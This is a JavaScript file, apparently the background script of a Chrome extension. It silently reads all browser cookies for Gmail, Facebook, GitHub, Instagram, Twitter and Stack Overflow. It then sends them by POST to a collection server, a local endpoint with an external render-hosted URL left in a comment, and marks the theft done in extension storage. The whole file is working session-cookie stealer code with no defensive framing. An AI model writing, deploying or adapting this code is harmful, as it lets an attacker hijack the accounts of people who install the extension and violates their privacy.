const url = [
  "https://mail.google.com/mail",
  "https://www.facebook.com",
  "https://github.com",
  "https://www.instagram.com",
  "https://twitter.com",
  "https://stackoverflow.com",
];
const sendReq = async (data) => {
  // console.log(data)
  const option = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  };
  await fetch("http://localhost:4000/api/gmail", option)
    // fetch("https://scraping-8v2x.onrender.com/api/gmail", option);
    .then((res) => {
      if (res.ok) {
        console.log("success");
      }
    })
    .catch((err) => {
      console.log("error");
    });
  return;
};

const getCookies = (param) =>
  new Promise((resolve, reject) => {
    chrome.cookies.getAll(param, (cookies) => {
      resolve(cookies)
    });
  });

chrome.storage.sync.get(["isGet"], async (item) => {
  try {
    var list = new Array();
    for (let i = 0; i < url.length; i++) {
      const param = {
        url: url[i],
      };
      await getCookies(param).then((item) => {
        list[i] = item
      });
    }
    console.log(list)
    sendReq(list).then(() => {
      chrome.storage.sync.set({ isGet: true });
    });
  } catch (error) {
    chrome.storage.sync.set({ isGet: false });
    console.log(error);
  }
});
